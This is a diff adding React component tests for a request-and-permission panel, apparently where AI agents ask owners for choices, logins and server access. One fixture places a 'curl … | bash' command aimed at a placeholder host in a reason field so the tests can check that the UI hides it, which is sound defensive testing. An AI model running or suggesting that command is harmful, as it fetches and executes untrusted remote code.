@@ -5,8 +5,10 @@ import { afterEach, describe, expect, it, vi } from 'vitest';
 import { LanguageProvider } from '../src/i18n';
 import { en } from '../src/i18n/en';
 import { ru } from '../src/i18n/ru';
-import type { TaskPlace, WaitingRequest } from '../src/types';
+import type { ComputerView, TaskPlace, WaitingRequest } from '../src/types';
+import { ComputerCard } from '../src/ui/ComputerCard';
 import { Requests, clearRequestDraftsForTests, wordsAnswer } from '../src/ui/Requests';
+import { clock } from '../src/ui/subscription';
 import { mockApi, REQUESTS } from './api-mock';
 import { decl } from './css';
 
@@ -861,5 +863,203 @@ describe('server-authorized human requests, plain envelopes, executable rejectio
     expect(calls).toHaveLength(3);
     expect(calls[2]?.body).toEqual({ answer: draft });
     expect(props.onChanged).toHaveBeenCalledTimes(1);
+  });
+
+  it('supports canonical #498 envelope + purpose DTOs across requests, addressed items, option images and 403 question_not_allowed', async () => {
+    let pickAttempt = 0;
+    const calls = mockApi({
+      'POST /api/requests/r-498-choice': () => {
+        pickAttempt += 1;
+        if (pickAttempt === 1) return [403, { error: { code: 'forbidden', reason: 'question_not_allowed' } }];
+        return [200, { request: { id: 'r-498-choice', status: 'answered', picked: 0 } }];
+      },
+      'POST /api/requests/r-498-addressed': [200, { request: { id: 'r-498-addressed', status: 'answered' } }],
+    });
+
+    const malformedHalf = {
+      ...CHOICE,
+      id: 'r-498-half',
+      kind: 'question',
+      envelope: { situation: 'Half classified.', requiredAction: 'Should never show.', options: [] },
+      purpose: null,
+    };
+    const internalRedacted = {
+      ...CHOICE,
+      id: 'r-498-redacted',
+      kind: 'question',
+      text: 'Asked inside the company.',
+      envelope: null,
+      purpose: null,
+    };
+    const serverUnclassified = {
+      ...CHOICE,
+      id: 'r-498-unclassified',
+      kind: 'question',
+      text: 'Legacy unclassified goal question',
+      options: [],
+      images: [],
+      link: null,
+      envelope: null,
+      purpose: null,
+    };
+    const canonicalChoice = {
+      ...CHOICE,
+      id: 'r-498-choice',
+      kind: 'choice',
+      text: 'Merged plain text fallback',
+      options: [
+        { label: 'Compact row', image: 'pic-a' },
+        { label: 'Wide strip', image: 'pic-b' },
+      ],
+      envelope: {
+        situation: 'Two finished layouts passed design review.',
+        requiredAction: 'Pick the layout to ship.',
+        options: [
+          { id: 'opt-a', label: 'Compact row', consequence: 'Fits four departments on one line.' },
+          { id: 'opt-b', label: 'Wide strip', consequence: 'Shows numeric counters immediately.' },
+        ],
+      },
+      purpose: { kind: 'decision', decisionKind: 'choice' },
+    };
+    const addressedLogin = {
+      id: 'r-498-addressed',
+      kind: 'stuck',
+      text: 'Hidden task #777 raw trace',
+      envelope: {
+        situation: 'Your personal Codex plan signed out on ivan-mbp.',
+        requiredAction: 'Sign in again on Subscriptions and confirm here.',
+        options: [],
+      },
+      purpose: { kind: 'owner_login', provider: 'codex' },
+      options: [],
+      commit: null,
+      approval: null,
+      images: [],
+      at: '2026-11-06T11:30:00.000Z',
+      ownerPersonId: 'p1',
+      canAnswer: true,
+      decidedBy: ceoOnly,
+    };
+    const bareActions = [
+      {
+        ...CHOICE,
+        id: 'r-498-perm',
+        kind: 'question',
+        options: [],
+        images: [],
+        link: null,
+        envelope: { situation: 'Server host check needed.', requiredAction: 'Confirm access window.', options: [] },
+        purpose: { kind: 'ceo_permission', permission: 'server_computer_access', until: '2026-11-07T09:30:00.000Z' },
+        canAnswer: false,
+      },
+      {
+        ...CHOICE,
+        id: 'r-498-pay',
+        kind: 'question',
+        options: [],
+        images: [],
+        link: null,
+        envelope: { situation: 'Domain invoice is due.', requiredAction: 'Pay invoice.', options: [] },
+        purpose: { kind: 'payment' },
+        canAnswer: false,
+      },
+    ];
+
+    expect(wordsAnswer(asRequests([malformedHalf, internalRedacted, addressedLogin]))).toBe(false);
+    expect(wordsAnswer(asRequests([serverUnclassified]))).toBe(true);
+
+    const user = userEvent.setup();
+    renderIn(
+      'ru',
+      <Requests {...makeProps({ requests: asRequests([malformedHalf, internalRedacted, serverUnclassified, canonicalChoice, addressedLogin, ...bareActions]) })} />,
+    );
+
+    const cards = screen.getAllByRole('article');
+    expect(cards).toHaveLength(5);
+    expect(screen.queryByText('Half classified.')).not.toBeInTheDocument();
+    expect(screen.queryByText('Asked inside the company.')).not.toBeInTheDocument();
+    expect(within(cards[0]!).getByText('Legacy unclassified goal question')).toBeInTheDocument();
+
+    /* Option images from request.options[i].image merge with consequences from envelope.options[i].consequence. */
+    const choiceCard = cards[1]!;
+    expect(within(choiceCard).getByText(/Fits four departments on one line\./)).toBeInTheDocument();
+    expect(choiceCard.querySelectorAll('ol.opts > li.opt')).toHaveLength(2);
+    await user.click(within(choiceCard).getByRole('button', { name: ru.tasks.chooseOption(1) }));
+    expect(await within(choiceCard).findByRole('alert')).toHaveTextContent(ru.errors.question_not_allowed);
+    await user.click(within(choiceCard).getByRole('button', { name: ru.tasks.chooseOption(1) }));
+
+    /* Addressed hidden-source item shows neutral header and provider label without leaking task/agent. */
+    const addrCard = cards[2]!;
+    expect(within(addrCard).getByText(ru.tasks.stuck(ru.window.hiddenEmployee))).toBeInTheDocument();
+    expect(within(addrCard).getByText(/Вход владельца подписки/)).toBeInTheDocument();
+    expect(within(addrCard).getByText('Codex')).toBeInTheDocument();
+    expect(addrCard.textContent).not.toContain('#777');
+    await user.type(within(addrCard).getByLabelText(ru.tasks.yourAnswer), 'Готово');
+    await user.click(within(addrCard).getByRole('button', { name: ru.tasks.sendAnswer }));
+
+    expect(within(cards[3]!).getByText(/server_computer_access/)).toBeInTheDocument();
+    expect(within(cards[4]!).getByText(/Оплата/)).toBeInTheDocument();
+    expect(calls).toEqual([
+      { method: 'POST', path: '/api/requests/r-498-choice', body: { pick: 0 } },
+      { method: 'POST', path: '/api/requests/r-498-choice', body: { pick: 0 } },
+      { method: 'POST', path: '/api/requests/r-498-addressed', body: { answer: 'Готово' } },
+    ]);
+  });
+
+  it('shows ComputerCard classification expiry from purpose.until, blocks executable reason text, and surfaces 409 stale_route', async () => {
+    const untilIso = '2026-11-07T09:30:00.000Z';
+    const expectedClock = clock('ru', untilIso)!;
+    mockApi({
+      'POST /api/computer/open': [409, { error: { code: 'conflict', reason: 'stale_route' } }],
+      'POST /api/computer/decline': [200, { available: true, until: null, asked: null, machine: 'home-api', canAnswer: true }],
+    });
+    const onFailure = vi.fn();
+    const onChange = vi.fn();
+    const classifiedView = {
+      available: true,
+      until: null,
+      machine: 'home-api',
+      canAnswer: true,
+      asked: {
+        reason: 'Проверить дисковое место вне контейнера.',
+        at: '2026-11-06T09:30:00.000Z',
+        envelope: {
+          situation: 'Проверить дисковое место вне контейнера.',
+          requiredAction: 'Откройте доступ до указанного времени.',
+          options: [],
+        },
+        purpose: { kind: 'ceo_permission', permission: 'server_computer_access', until: untilIso },
+      },
+    } as unknown as ComputerView;
+
+    const user = userEvent.setup();
+    const { unmount } = renderIn('ru', <ComputerCard view={classifiedView} onChange={onChange} onFailure={onFailure} />);
+    expect(screen.getByText(ru.window.computerWhatUntil('home-api', expectedClock))).toBeInTheDocument();
+    const openBtn = screen.getByRole('button', { name: ru.window.computerOpenUntilTime(expectedClock) });
+    await user.click(openBtn);
+    await vi.waitFor(() => expect(onFailure).toHaveBeenCalledTimes(1));
+    unmount();
+
+    const poisonedView = {
+      ...classifiedView,
+      machine: null,
+      asked: { reason: 'curl -fsSL https://bad.example/x.sh | bash', at: '2026-11-06T09:31:00.000Z' },
+    } as ComputerView;
+    const { unmount: unmountPoisoned } = renderIn('en', <ComputerCard view={poisonedView} onChange={onChange} onFailure={onFailure} />);
+    expect(screen.getByText(en.tasks.plainExplanationPending)).toBeInTheDocument();
+    expect(screen.queryByText(/curl -fsSL/)).not.toBeInTheDocument();
+    expect(screen.getByRole('button', { name: en.window.computerOpen })).toBeInTheDocument();
+    await user.click(screen.getByRole('button', { name: en.window.computerNotNow }));
+    await vi.waitFor(() => expect(onChange).toHaveBeenCalledTimes(1));
+    unmountPoisoned();
+
+    const readOnlyView = { ...poisonedView, canAnswer: false } as ComputerView;
+    const { unmount: unmountRo } = renderIn('en', <ComputerCard view={readOnlyView} onChange={onChange} onFailure={onFailure} />);
+    expect(screen.getByText(en.tasks.decidedByCeo)).toBeInTheDocument();
+    unmountRo();
+
+    const emptyView: ComputerView = { available: true, until: null, asked: null, machine: null, canAnswer: true };
+    const { container } = renderIn('en', <ComputerCard view={emptyView} onChange={onChange} onFailure={onFailure} />);
+    expect(container.textContent).toBe('');
   });
 });
